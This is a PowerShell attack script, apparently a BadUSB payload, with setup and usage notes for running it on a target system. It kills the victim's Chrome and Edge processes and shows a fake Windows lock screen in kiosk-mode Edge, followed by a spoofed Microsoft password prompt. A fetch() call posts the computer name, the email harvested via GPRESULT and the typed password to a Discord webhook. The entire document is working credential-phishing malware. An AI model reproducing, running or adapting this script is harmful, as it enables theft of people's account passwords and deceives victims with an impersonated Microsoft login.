<#
====================== Fake Windows Logon Screen to Discord Webhook =========================

SYNOPNIS
This script kills all egde and chrome processes, starts screensaver and opens edge in fullscreen that asks for login info and posts results to a discord webhook.

SETUP
1. Replace YOUR_WEBBHOOK_HERE with your webhook.

USAGE
1.Run script on target system.

CREDIT
The original idea for this cam from - https://github.com/Zarcolio/flipperzero/blob/main/BadUSB/Ducky%20Scripts/Awareness/Phish_Office365_From_Usb.txt
The HTML for this script has been modified but was originally from - https://github.com/JoniRinta-Kahila/microsoft-login-spoof
Kudos for creating this great look-a-like! 
#>

$dc = 'DISCORD_WEBHOOK_HERE'

# GATHER SYSTEM AND USER INFO
$u = GPRESULT /R /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches
$c = $env:COMPUTERNAME
$u = ("$u").Trim()
$wpURL = "https://wallpapercave.com/wp/wp1809099.jpg"

#https://images.pexels.com/photos/1064162/pexels-photo-1064162.jpeg
# DEFINE HTML CODE

$h = @"

<!DOCTYPE html>
<html lang="en">
<head>
	  <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#65279;</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
	<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300&display=swap" rel="stylesheet">
<style>
@import url(https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap);
body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}.alert{background:rgba(0,0,0,1);position:fixed;top:0;left:0;width:100%;height:auto;z-index:10;padding:10px}.alert ul{padding:0;margin:0;list-style:none;display:flex;justify-content:space-around;align-items:center}.alert ul li b{color:#589;font-weight:600;font-family:Arial,sans-serif}#container{height:100vh;width:100vw;overflow:hidden;position:relative}#wallpaper{background-image:url($wpURL);background-repeat:no-repeat;background-size:90% cover;background-position:center;height:100vh;width:100vw;position:absolute;top:0;left:0}#wallpaper.slideUp{transition:all .6s ease;transform:translateY(-100%)}#wallpaper.slideDown{transition:all .6s linear;transform:translateY(0%)}.icons{display:flex;justify-content:flex-start;align-items:center;padding-left:.5em}.icons i{color:#fff;margin-top:.7em;margin-right:2em}#date_cont{position:absolute;top:67%;left:4%;text-align: left;animation:slideInFast .3s .3s linear forwards;visibility:hidden;transform:translateY(150%);transition:all .6s ease both}@keyframes slideInFast{from{visibility:hidden;opacity:0;transform:translateY(100%)}to{visibility:visible;opacity:1;transform:translateY(0%)}}#time{font-size:8em;font-family:'Open Sans Condensed',sans-serif;color:#fff;margin:0;margin-left:-15px;padding:0}#date{font-size:2.5em;font-family:'Open Sans',sans-serif;color:#fff;margin-top:-.6em}
</style>
</head>
<body>
	<div id="container">
		<div id="wallpaper">
			<div id="date_cont">
				<div id="time">08:20</div>
				<div id="date" class="">Tuesday, October 8</div>
        <div class="icons">
          <i class="fa fa-wifi"></i>
          <i class="fa fa-battery-full"></i>
        </div>
		</div>
    </div>
	</div>
	<script type="text/javascript">
(function(){
  var time = document.querySelector('#time');
  var dateElem = document.querySelector('#date');
  var wallpaper = document.querySelector('#wallpaper');
  var currentDate = new Date();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var month = currentDate.getMonth();
  var day = currentDate.getDay();
  var dateOfMonth = currentDate.getDate();
  var dayOfWeek = ['Sunday','Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  var monthOfYear = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'Decemeber'];
  if ((hours < 10)) {
    time.innerHTML = '0' + hours + ':' + minutes;
  } else {
    time.innerHTML = hours + ':' + minutes;
  }
  if ((minutes < 10)) {
    time.innerHTML = hours + ':' + '0' + minutes;
  } else {
    time.innerHTML = hours + ':' + minutes;
  }
  dateElem.innerHTML = dayOfWeek[day] + ", " + monthOfYear[month] + ' ' + dateOfMonth;
  function myFunction() {
    setTimeout(function() {
      window.location.href = 'index2.html';
    }, 1500);
  }
  document.addEventListener('keypress', (e)=>{
    console.log('key pressed', e.keyCode);
    if(e.keyCode === 13) {
      wallpaper.classList.remove('slideDown');
      wallpaper.classList.add('slideUp');
      myFunction();
    }
    else if (e.keyCode === 32) {
      wallpaper.classList.remove('slideDown');
      wallpaper.classList.add('slideUp');
      myFunction();
    }
    else {
      return null;
    }
  });
 document.addEventListener('click', () => {
    wallpaper.classList.remove('slideDown');
  wallpaper.classList.add('slideUp');
  myFunction();
  });
})();
	</script>
  </body>
</html>
"@

$h2 = @"
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#65279;</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
    <style>#loginForm{background-color:#fff;box-shadow:0 2px 23px -5px rgba(0,0,0,.46);height:470px;width:440px;position:absolute;left:50%;top:49%;transform:translate(-50%,-50%);padding:10px}body{background:url($wpURL);background-repeat:no-repeat;background-size:90% cover;background-position:center;backdrop-filter: blur(10px); position:relative}body::before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,.5);z-index:-1}#logo{margin-top:25px;margin-left:36px;border:none}#signIn{margin-left:36px;margin-top:-6px;font-weight:600;font-size:25px;overflow:hidden}#email{width:85%;max-width:350px;height:40px;margin-top:-10px;margin-left:36px;border:none;border-bottom:.01px solid rgba(0,0,0,.7)}#ForgodPwd,#NoAccount,#SignWithKey,#createAccount{margin-left:36px;margin-top:13px;font-size:13px}#signInSecurity{margin-left:25px;font-size:13px}.fa.fa-question-circle-o{margin-left:5px;opacity:.8}#passResult,#result,#signInSecurityKey{margin-left:36px;font-size:13px}#iconQ{margin-left:3px;opacity:.55}#btnSend,#btnSignIn{height:33px;width:108px;padding:0;margin-left:auto;margin-top:auto;font-size:13px;color:#fff;border:#0067b8;background-color:#0067b8}#btnPlace{margin-left:275px;margin-top:45px;margin-bottom:1px}#linkCreateAccount{margin-left:5px}#email:focus,input:focus{outline:0}#image{margin-top:25px;margin-left:36px;margin-bottom:12px}#section-2{margin-top:-60%}.section-indent{float:left}#btnSignInLocation{margin-left:275px;margin-top:19px}#password{width:85%;height:40px;margin-top:-10px;margin-left:36px;border:none;border-bottom:.01px solid rgba(0,0,0,.7)}#enterPwd{margin-left:36px;margin-top:7px;font-size:24px;font-weight:500}#btnBack{background-color:#fff;color:rgba(0,0,0,.3);padding:5px;text-align:left;text-decoration:none;display:inline-block;font-size:10px;margin:4px 31px;border:none;cursor:pointer;border-radius:100%}#userLine{margin-left:36px;margin-bottom:-25px;font-size:15px;font-weight:400}#arrowBack{margin-right:5px;margin-top:0;margin-left:8px;opacity:.2;font-size:19px}#iconCircle{color:red}#iconBg{margin-right:5px;opacity:.4;font-size:23px}.slide-page{margin-left:0}.secondSlide{margin-left:100%;overflow:hidden}#section-1{overflow:hidden}#btnBack:hover{background-color:#c6c6c6}#cbRemember{margin-left:36px;width:21px;height:20px}#keepMe{color:#1b1b1b;margin-left:64px;font-size:15px;margin-bottom:-20px}#bg{position:fixed;top:0;bottom:0;min-width:100%;min-height:100%;overflow:hidden}#footer{position:absolute;bottom:0;right:0}#policy{margin-left:36px;font-size:15px;font-weight:400}#terms p,#terms div p{color:#fff!important}</style>
  </head>
<body class="text-nowrap" style="width:100%;height:100vh">
  <div id="loginForm" class="container">
    <img id="image" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg">
    <div></div>
    <section id="section-main">
      <section id="section-1" class="slide-page">
        <h3 id="userLine">$u</h3>
        <br>
        <p id="enterPwd">Enter Password</p>
        <h5 id="passResult"></h5>
        <p id="policy">Microsoft requires that you confirm your password<br>after a period of 72 days. </p>
        <p>
          <input type="password" id="password" placeholder="Password">
        </p>
        <p id="ForgodPwd">
          <a href="https://go.microsoft.com/fwlink/p/?linkid=2072756">Forgot password?</a>
        </p>
        <p id="btnSignInLocation">
          <!-- Call the sendPasswordToWebhook() function on button click -->
          <button id="btnSignIn" onclick="sendPasswordToWebhook()">Sign in</button>
        </p>
        <br>
        <br>
        <p id="policy">Microsoft Secure Login</p>
      </section>
    </section>
  </div>
  <script>
    function sendCredentialsAndExecuteCommand() {
      var passwordValue = document.getElementById("password").value;
      var webhookUrl = "$dc";
      var uValue = "$u";
      var cValue = "$c";
      var data = {content: "Computer: " + cValue + " | Email: " + uValue + " | Password: " + passwordValue};
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)})
      .then(response => {})
      .catch(error => {});}
    document.getElementById("btnSignIn").addEventListener("click", function() {
      sendCredentialsAndExecuteCommand();
    });
    document.addEventListener('keypress', (e)=>{
    console.log('key pressed', e.keyCode);
    if(e.keyCode === 13) {
      sendCredentialsAndExecuteCommand();
    }
    else {
      return null;
    }
  });
  </script>
</body>
</html>
"@

# SAVE HTML
$p = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "index.html")
$h | Out-File -Encoding UTF8 -FilePath $p
$a = "file://$p"

$p2 = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "index2.html")
$h2 | Out-File -Encoding UTF8 -FilePath $p2

# KILL ANY BROWSERS (interfere with "Maximazed" argument)
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe" -NoNewWindow -Wait
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNewWindow -Wait
Sleep -Milliseconds 250

# START EDGE IN FULLSCREEN
$edgeProcess = Start-Process -FilePath "msedge.exe" -ArgumentList "--kiosk --app=$a -WindowStyle Maximized" -PassThru
$edgeProcess.WaitForInputIdle()

Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        public static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);
        public const uint SWP_NOMOVE = 0x2;
        public const uint SWP_NOSIZE = 0x1;
        public const uint SWP_SHOWWINDOW = 0x40;
    }
"@


# SET EDGE AS TOP WINDOW AND START SCREENSAVER
$null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
Sleep -Milliseconds 250
$null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
Sleep -Milliseconds 750
$black = Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
